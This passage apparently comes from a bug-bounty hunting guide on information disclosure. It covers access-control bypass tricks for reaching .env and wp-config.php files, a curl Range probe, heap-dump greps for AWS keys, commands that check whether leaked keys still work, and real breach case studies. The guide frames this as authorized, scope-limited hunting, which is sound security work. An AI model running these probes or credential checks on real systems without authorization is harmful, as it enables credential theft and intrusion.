- **Backup-file fuzzing past the canonical filename** — when `wp-config.php` is denied, try `wp-config.php.bak`, `wp-config.php.old`, `wp-config.php~`, `wp-config.php.swp`. Server's deny rule covers exact filename only. Reference: H1 reports at https://hackerone.com/reports/3328408 and https://hackerone.com/reports/3252302 (2026 High disclosed).
- **Trailing-slash bypass on protected paths** — `/admin` blocked but `/admin/` reachable (or vice versa). Common on misconfigured nginx `location` blocks; documented across PortSwigger Web Security Academy labs.
- **Case mutation on path-based ACL** — `/Admin/`, `/ADMIN/`, `/aDmIn/` may bypass Apache/nginx case-sensitive deny rules when application is case-insensitive. Documented in PortSwigger access-control labs.
- **URL-encoding bypass** — `/.env` blocked but `/%2eenv` or `/.%65nv` reachable. Double-encoding bypasses some normalizers; same class as Apache CVE-2024-38472 path-confusion (Orange Tsai BHUSA 2024).
- **Subdomain bypass for production-only deny rules** — `admin.target.com/.env` blocked but `staging.target.com/.env` allowed because deny rule only deployed to production env. Documented across HackerOne hacktivity disclosed 2024-2025 (Shopify, GitHub, GitLab subdomain reports).
- **Range header to read partial protected file** — `curl -H "Range: bytes=0-100" https://target/.env` may return 206 even when GET returns 403 due to nginx misconfig.
- **HEAD vs GET asymmetry** — HEAD request bypasses ACL that only checks GET; HEAD response includes Content-Length revealing file size. Documented across PortSwigger Web Security Academy labs and HackerOne hacktivity disclosed 2024.
- **HTTP/2 and HTTP/3 path-handling differences** — HTTP/2 may strip path prefix differently than HTTP/1.1; ACL written for one protocol bypassed by the other. James Kettle PortSwigger Research 2023-2024 documents this class.
- **Cookie tossing for cross-subdomain credential exposure** — see hunt-xss.md Chain 9; subdomain attacker can override session cookie scope. Reference: H1 reports https://hackerone.com/reports/3321406 and https://hackerone.com/reports/3423950 (2026 High disclosed).
- **CORS `null` origin bypass** — when `Access-Control-Allow-Origin: null` is set, sandboxed iframes (`<iframe sandbox>`) get null origin and are allowed. Documented at PortSwigger Web Security Academy CORS lab series.
- **TLS SNI mismatch** — Apache vhosts dispatched by Host header may serve different config when SNI doesn't match Host; secrets-restricted vhost reachable via spoofed SNI. Same class as Apache CVE-2024-38472/38476 Confusion Attacks (Orange Tsai BHUSA 2024).
- **Authentication-only-on-frontend** — frontend hides admin endpoints but API doesn't enforce; direct API call returns full data. Documented at https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/ and across HackerOne hacktivity disclosed 2024.
- **Time-based enumeration when responses are identical** — bcrypt hash comparison takes ~100ms; missing-user response is immediate. Time login responses to enumerate. MinIO GHSA-jv87-32hw-hh99 LDAP variant is the canonical case.
- **TruffleHog actively-validated false-negatives** — TruffleHog only validates secrets it has detectors for; custom internal API keys without detectors won't be flagged. Manually grep for organization-specific patterns. Reference: https://github.com/trufflesecurity/trufflehog supports 800+ detectors but custom org formats need manual rules.
- **Heap-dump pattern matching for non-standard secret formats** — `strings heapdump.bin | grep -E '<your-org-prefix>'` for internal token formats. Volkswagen pattern via SYSCREST analysis https://www.syscrest.com/2025/02/securing-spring-boot-actuator/.

## Gate 0 Validation

Before you write the report, prove these five things:

1. **Concrete demonstration with measurable impact.** "I see `/server-status` exposed" without showing what it leaks is informational. Show the specific data: 3 IPs from the request log, the framework version revealed, the credential extracted. For credentials: validate they're live (`aws sts get-caller-identity`, `curl https://api.github.com/user -H "Authorization: token X"`). Don't pivot — confirm + stop.

2. **Business loss mapping.** Map to one of: customer PII exposure (count records), credential theft (active key validated), source-code leak (commits + file count), financial/healthcare data exposure (regulatory implication: GDPR, HIPAA, PCI, GLBA), credential reuse risk (key has access to N additional resources). Quantify.

3. **Reproducibility in 10 minutes.** Curl one-liner for the leak. If credentials need validation, document the validation command. Triagers close anything they can't repro at lunch.

4. **Scope check.** Asset in scope (info-disclosure on out-of-scope subdomains is N/A even if real). Credentials belong to target organization (not a third-party SaaS the target uses). Re-check after 24h — orgs sometimes patch within hours of submission, so confirm the leak is still present at submit time. **Critical for credentials**: confirm the program treats credential exposure as in-scope (see Cremit Apr 2026 analysis — several programs including Atlassian, Shopify, GitLab explicitly exclude this class).

5. **PoC artifacts**: 30-60 second screen recording showing the leak fired (asciinema or mp4 — no edits, no zooms hiding the URL). Burp request/response screenshot with non-sensitive headers visible. Curl command in plain text. For credentials: redacted credential value with length confirmed (e.g., `AKIA****************` 20 chars). For PII: 3 redacted sample records. **Never** include actual sensitive data in the report — describe it but redact values.

If any of the 5 fails: **stop**. You have a finding, not a report. Common kill-list items:

- "I found .env exposed" without confirming credentials inside are live → low-tier (informational)
- "Stack trace leaks /var/www/" without revealing material — informational
- "Swagger exposed" without showing what hidden endpoints it reveals — informational
- "Username enumeration via login response" without timing data or response delta — needs proof

## Real Impact Examples

**Example 1 — `volkswagen-spring-actuator-heapdump-aws-keys-9TB-gps-data` (mid five-figure bounty range, multi-link cloud-takeover chain — Wiz Threat Research Dec 2024 disclosure)**
- Setup: Volkswagen telematics service running Spring Boot. `/actuator/heapdump` endpoint exposed without authentication — the default Spring Boot Actuator behavior when `management.endpoints.web.exposure.include=*` is set.
- Discovery: Wiz Threat Research team during routine cloud-misconfiguration analysis. Heap dump downloadable via single GET request to `/actuator/heapdump`. The dump contained the full JVM memory state including environment variables, in-flight request data, and AWS SDK credential cache.
- Exploitation: Researchers downloaded the heap dump (~1-2 GB binary). Ran `strings heapdump.bin | grep -E 'AKIA[0-9A-Z]{16}'` to extract AWS access keys. Validated keys via `aws sts get-caller-identity`. The keys had S3 read access to a bucket containing GPS tracking data for Volkswagen-connected vehicles.
- Impact: 9 terabytes of GPS data covering hundreds of thousands of cars exfiltratable. Combined location data with vehicle identifiers (VINs) — direct PII / surveillance impact. Could have enabled mass-tracking of Volkswagen owners.
- Disclosed source: Wiz Threat Research disclosure (Dec 2024); SYSCREST analysis at https://www.syscrest.com/2025/02/securing-spring-boot-actuator/ (Feb 2025); Cyber Kendra summary at https://www.cyberkendra.com/2024/12/vulnerability-in-spring-boot-actuator.html. Wiz documented 60% of cloud environments use Spring Boot Actuator and 11% expose publicly. Bounty paid via Volkswagen's program in mid five-figure tier (specific amount not publicly disclosed).

**Example 2 — `sysdig-emeraldwhale-15K-cloud-creds-from-67K-git-configs` (mass exploitation pattern, mid four-figure direct on individual program disclosures — Sysdig Threat Research Oct 2024)**
- Setup: Web servers across thousands of domains misconfigured to serve `/.git/config` at the application root. Includes Laravel apps with `.env` files in webroot.
- Discovery: Sysdig Threat Research Team (TRT) analyzed the EMERALDWHALE campaign — automated tool scanning IP ranges for exposed Git configuration files. Identified 67,000 URLs exposing config files across the internet. The tool extracted authentication tokens, validated them via curl against various APIs (AWS, GitHub, Mailgun, etc.), then downloaded private repos using validated GitHub tokens.
- Exploitation: Attacker tooling automated the chain: scan → fetch `.git/config` → extract tokens → validate → download private repos → recursive secret extraction from repo contents. Stolen secrets stored in 1TB S3 bucket. Stolen 15,000 cloud credentials from 67,000 URLs (28K Git repos, 6K GitHub tokens, 2K validated active credentials).
- Impact: Mass credential theft enabling cloud-account takeover, private-repo exfiltration, downstream supply-chain attacks. Sysdig observed Multigrabber v8 tool used for the exfil. Credentials sold on Telegram for $100 per URL list.
- Disclosed source: https://sysdig.com/blog/emeraldwhale (Sysdig TRT Oct 2024); https://www.bleepingcomputer.com/news/security/hackers-steal-15-000-cloud-credentials-from-exposed-git-config-files/. The defensive bug-bounty version: hunters running the same scan against in-scope subdomains find similar exposures and report individually — bounties range from low four-figure (single .env / .git exposure) to mid four-figure (active AWS keys validated).

**Example 3 — `eshyft-public-s3-bucket-86K-medical-records` (researcher disclosure pattern, healthcare PII — Jeremiah Fowler March 2025)**
- Setup: ESHYFT (New Jersey-based healthcare staffing platform — "Uber for nurses") had an Amazon S3 bucket configured with public access. The bucket was non-password-protected, unencrypted, and contained sensitive health-care worker data.
- Discovery: Cybersecurity researcher Jeremiah Fowler discovered the bucket on January 4 2025 via routine cloud-asset scanning (subdomain enumeration → bucket-name guess → public listing test). The bucket contained 108.8 GB of data with 86,341 records.
- Exploitation: Fowler identified the bucket via standard enumeration techniques, confirmed public access via `curl https://<bucket>.s3.amazonaws.com/`, downloaded a sample of records to confirm content. Did not exfiltrate at scale — reported to ESHYFT on January 6 2025.
- Impact: 86,341 records exposed — user profile pictures + facial images, scanned drivers licenses, Social Security cards, professional certificates, work assignment agreements, CVs/resumes, medical diagnoses, prescription records, disability insurance claims. HIPAA-implicating exposure.
- Disclosed source: https://www.theregister.com/2025/03/11/uber_for_nurses_exposes_86k/ (The Register Mar 11 2025); https://beyondmachines.net/event_details/over-86000-healthcare-worker-records-leaked-in-eshyft-s-unsecured-s3-bucket-8-4-g-i-1/gD2P6Ple2L. ESHYFT took >1 month to close the bucket after notification. Pattern: most healthcare/financial bug bounty programs pay mid four-figure to low five-figure for similar findings depending on record count and PII sensitivity tier.

**Example 4 — `dgraph-debug-pprof-cmdline-admin-token-leak` (low five-figure bounty range on Dgraph-class targets, Go service info-disclosure pattern, GHSA-95mq-xwj4-r47p 2026 critical)**
- Setup: Dgraph Alpha instance deployed with `--security "token=<admin-token>"` for admin API authentication. Process exposed `/debug/pprof/cmdline` endpoint via default Go `net/http/pprof` import with no authentication.
- Discovery: Researcher probed `/debug/pprof/cmdline` — a standard Go pprof endpoint that returns `argv` of the running process. Response contained the full command line: `dgraph alpha --security "token=actual-admin-token-value-here" --my=...`.
- Exploitation: Extracted admin token from `/debug/pprof/cmdline` response. Used token to authenticate to admin API: `curl -H "X-Dgraph-AccessToken: <token>" https://target/admin`. Admin API allows schema modification, predicate drops, user management — full database control.
- Impact: Unauthenticated debug endpoint → admin token disclosure → full database admin access. The fix: remove `import _ "net/http/pprof"` from production builds, or restrict pprof to a separate non-public mux.
- Disclosed source: GHSA-95mq-xwj4-r47p (2026 critical, Dgraph). Pattern repeats across every Go service that uses `--flag="value"` for secrets and exposes pprof — same class of bug in many internal Go microservices.

**Example 5 — `nasa-bitbucket-env-uat-credentials` (low four-figure bounty range on equivalent commercial paid programs, kudos-only on NASA VDP — _x3ro_ Bugcrowd Aug 2025)**
- Setup: NASA's Bitbucket server hosted a `.env` file accessible via HTTP. The file contained UAT-environment credentials used by a script to authenticate with NASA's `cmr.sit.earthdata.nasa.gov` SIT (System Integration Testing) token service.
- Discovery: Researcher `_x3ro_` ran subdomain / asset enumeration against NASA VDP scope, then path probing for `.env` and other config-file exposure. Found the `.env` accessible without authentication.
- Exploitation: Downloaded `.env`, identified plaintext credentials for `cmr.sit.earthdata.nasa.gov`. Validated credentials authenticated successfully against the NASA SIT token service. Did not pivot — submitted finding directly with credential validation proof.
- Impact: Live UAT credentials exposed — could enable unauthorized access to NASA earthdata systems, data extraction, API abuse. NASA classified P3 (medium severity) per Bugcrowd VRT.
- Disclosed source: Bugcrowd disclosure at https://redpacketsecurity.com/bugcrowd-bugbounty-disclosure-publicly-accessible-env-file-exposing-hardcoded-credentials-on-nasa-s-git-repository (disclosed by _x3ro_, 2025-08-20). NASA VDP is informational/kudos only — but the same finding on a paid program (commercial SaaS) would be low to mid four-figure depending on credential scope.

**Example 6 — `glances-central-browser-serverslist-downstream-credentials` (low five-figure bounty range on monitoring platforms and internal SaaS observability stacks — GHSA-r297-p3v4-wp8m / GHSA-gfc2-9qmw-w7vh 2026 critical)**
- Setup: Glances Central Browser mode exposed `/api/4/serverslist` without adequate access control. The endpoint returned the configured downstream server inventory, including connection metadata and credentials used by the central node.
- Discovery: Researcher or hunter fingerprints Glances via `/api/4/status`, `/api/4/pluginslist`, permissive CORS, and the Central Browser UI, then requests `/api/4/serverslist` directly from an unauthenticated browser or curl session.
- Exploitation: Response body contains reusable host, port, username, password, token, or URL material for monitored servers. Validate only that the credential shape and target ownership are real; do not log into downstream infrastructure unless the program explicitly authorizes validation.
- Impact: One unauthenticated monitoring endpoint becomes a credential inventory leak for the fleet. On a SaaS or managed-infrastructure program this is materially stronger than "dashboard exposed" because it proves reusable secrets for internal systems.
- Disclosed source: GHSA-r297-p3v4-wp8m and GHSA-gfc2-9qmw-w7vh (Glances 2026 critical). Treat as the canonical report frame for any observability product that exposes configured downstream targets or agent tokens through inventory APIs.

## Anti-Targets / What's Dead

The kill-list. Where NOT to point the cannon.

- **Generic stack trace on a 404 page** — N/A or informational on most programs. Don't submit unless the trace reveals material info (DB connection string, internal IP, framework version mapping to an unpatched CVE). Always demonstrate what's exfiltrable.
- **`X-Powered-By: PHP/7.4.x` header alone** — version disclosure is N/A on its own. Don't submit unless you can chain to a known CVE for that version (then it's a CVE-replay report, not info-disclosure).
- **`/robots.txt` referencing `/admin/`** — won't pay; admins know about robots.txt by definition. Stop hunting unless robots.txt reveals unguessable paths or dev-only URLs.
- **Email enumeration alone via "email already in use"** — N/A on most modern programs because it's inherent to the UX. Don't submit alone; chain to mass-account-extraction for impact.
- **`/.git/HEAD` exposed but `git-dumper` returns 0 files** — informational only / N/A. Many servers serve `.git/HEAD` as default-file but block subdirectory access — without recoverable content the exposure is dead.
- **TruffleHog "potential secrets" without `--only-verified`** — won't pay because false-positive rate is huge. Stop submitting unverified TruffleHog matches; always pre-validate.
- **CORS `Access-Control-Allow-Origin: *` on public-by-design API** — N/A when API has no credentials and no per-user data. Don't submit; CORS is intentional for public APIs.
- **Source maps in production** — won't pay on most programs because frontend code is client-shipped anyway. Stop submitting bare `*.map` exposure; only paying when the map reveals internal API URLs or server-side code paths.
- **Bug-bounty programs that explicitly exclude credential exposure** — out-of-scope on several major programs (Atlassian, Shopify, GitLab per public scope statements). Check scope BEFORE reporting; the Cremit Apr 2026 analysis at https://www.cremit.io/blog/out-of-scope-loophole-credential-exposure documents this pattern.
- **WordPress wp-config.php exposed but salts already rotated** — N/A without live DB credentials. Don't submit; always validate creds before claiming paying impact.
- **Public S3 bucket with public-by-design content** (marketing assets, public docs) — N/A; misconfig only matters when private data exposed. Stop reporting bare bucket-listing on public-content buckets.
- **`/debug/pprof/` accessible but no secrets in process args** — N/A. The pay value is the secret leaked, not the endpoint. Don't submit pprof exposure alone.
- **NASA / DoD / government VDPs paying $0 / kudos** — these are informational-only programs; bounties are dead. Submit for hall-of-fame credit, not money. The same finding on a commercial paid program is low to mid four-figure.
- **Spring actuator `/health` exposed** — by design, used for K8s liveness probes. Won't pay; stop reporting bare `/health`. Only `/env`, `/heapdump`, `/configprops`, `/beans`, `/threaddump`, `/mappings`, `/loggers`, `/gateway` pay.
- **HTTP TRACE method enabled (XST class)** — mostly hardened across the modern web; XST won't pay on programs running modern HTTP servers. Don't submit unless you can demonstrate end-to-end XST exploit in a realistic browser environment.
- **Verbose 500 error revealing only Apache/Nginx version** — N/A; vendor doesn't consider banner disclosure a finding. Stop reporting bare server-version banners.

## Notes for the hunter

**24-month meta call-out.** The defining 2024-2026 info-disclosure story is **systemic credential exposure** via `.git/`/`/env`/Spring Boot Actuator/heap dumps — Sysdig EmeraldWhale (15K cloud creds), Unit42 (110K domain scan, 90K env-var combos, 7K active AWS keys), Wiz Volkswagen (9TB GPS data via single `/actuator/heapdump`), GitGuardian (28.65M secrets in 2025). If you hunt one new info-disclosure surface in the next quarter, it's running `nuclei -t http/exposures/spring-boot/` against every in-scope subdomain plus `git-dumper` against every 200-OK `.git/HEAD`. The second-place meta is **debug-endpoint family** — Dgraph `/debug/pprof/cmdline`, Glances `/api/4/serverslist`, FUXA plaintext DB creds, Harbor / NetBird default passwords (all 2025-2026 critical GHSAs). The third-place meta is **PII-via-API** with bounty scaling by record count on healthcare/financial programs (ESHYFT 86K records pattern).

**OSS targets where the next 6 months of paying bugs likely are.** Spring Boot deployments not pinned to current (CVE-2025-41243 / 41253 / 22235 family). Go services using `import _ "net/http/pprof"` in production. Self-hosted monitoring stacks (Glances, Prometheus, Grafana) with permissive CORS. Self-hosted GitOps (Rancher, ArgoCD) with cluster-template credential leakage. AI / ML platforms exposing model-registry credentials in metadata. Any SaaS using Vercel / Netlify with `_next/static/.../*.map` shipped.

**Anti-patterns reminder.** See the Anti-Targets section above. Most-common kills: stack trace without material info, version-banner-only disclosure, `/.git/HEAD` without recoverable repo, TruffleHog without `--only-verified`, programs that exclude credential exposure (always check scope first).

**Ground rule for impact in 2026:** generic info-disclosure pays mid three-figure to low four-figure; chained to active credential validation pays mid four-figure; chained to cloud-infrastructure read pays low to mid five-figure; full database access via leaked credentials pays mid five-figure on programs that pay this class. Always validate credentials before reporting — `aws sts get-caller-identity`, `curl https://api.github.com/user -H "Authorization: ..."`, etc. Dead credentials reduce the report to informational.

**Currency tip:** ~12 of the verified CVEs/GHSAs cited in this skill are from 2024-2026. Re-verify with `verify_citations.py` before finalizing any report; Spring releases security patches frequently and version constraints may shift.

## Top-Tier Operating Manual

**90-minute hunt loop**
1. 0-10 min: choose asset class by payout: actuator/heapdump, `.git`, `.env`, cloud bucket, debug endpoint, source repo, mobile binary, API over-fetch, stack trace.
2. 10-25 min: fingerprint every in-scope subdomain for exposed files and management endpoints. Prioritize staging, admin, old, dev, preview, and regional hosts.
3. 25-45 min: pull only the minimum artifact needed: first 50 lines of `.env`, `.git/config`, actuator index, bucket listing headers, one redacted API object.
4. 45-65 min: validate materiality. Check whether a key is live, whether PII is private, whether source is proprietary, whether endpoint reveals credentials or tenant data.
5. 65-80 min: upgrade or kill. Upgrade through active credential, cloud role identity, record count, regulatory class, or cross-tenant impact. Kill version banners and generic paths.
6. 80-90 min: package redacted proof. Do not download bulk data. Do not pivot beyond identity validation.

**Decision tree**
- If the leak is only banner/version/path, kill unless it maps to an exploitable unpatched CVE.
- If the leak contains credentials, validate liveness safely and stop.
- If the leak contains source code, scan for secrets and proprietary logic, then stop at counts.
- If the leak contains PII, count records from metadata or listing names; sample only your own or three redacted records.
- If the leak is `.git`, recover repo only when object files are reachable; `HEAD` alone is not enough.
- If actuator exposes `/health` only, kill. If `/env`, `/heapdump`, `/configprops`, or `/gateway` is exposed, prioritize immediately.

**False-positive graveyard**
- Public S3 bucket with marketing assets: kill.
- Source map containing only client code shipped to users: kill unless it exposes server secrets or private endpoints.
- Dead credential from TruffleHog: kill or report as hygiene only if program accepts it.
- Stack trace with framework name only: kill.
- Swagger docs for public API: kill unless hidden private endpoints or auth bypass are proven.
- `/actuator/health` or `/metrics` without sensitive labels: kill.

**Program economics**
- Active cloud credentials beat almost every other info-disclosure proof.
- PII record count matters: healthcare, finance, children, government IDs, and location data raise severity.
- Credential exposure is heavily policy-dependent. Confirm the program accepts leaked-secret reports before spending time.
- Debug endpoints pay when they reveal secrets, request data, process args, or internal admin topology.
- Source disclosure pays when it includes private repo contents, deploy secrets, or proprietary business logic.

**Report framing**
- Weak: "The `.env` file is public."
- Strong: "The public `.env` exposes a live AWS access key. `aws sts get-caller-identity` proves the key belongs to the target account and role `prod-app-readonly`. I did not list or download buckets; the role identity is sufficient to prove credential compromise."
- Expected pushback: "No customer data shown." Rebuttal: "I intentionally stopped at credential validation. The exposed role identity demonstrates unauthorized access potential without unsafe data access."
- Expected pushback: "This is a public bucket." Rebuttal: "The listed objects include private KYC document names and three redacted samples from my own account prove unauthenticated read."

**Automation harness**
- Use a subdomain-to-exposure scanner with per-path safe fetch limits: max bytes, max lines, no recursive download by default.
- Pipe secrets through verified detectors only, then validate with provider identity calls rather than data reads.
- Keep `evidence.json`: URL, status, content-type, bytes read, sensitive pattern, validation command, redaction status.
- Add a hard stop flag when a live credential is found; the next action should be report writing, not pivoting.
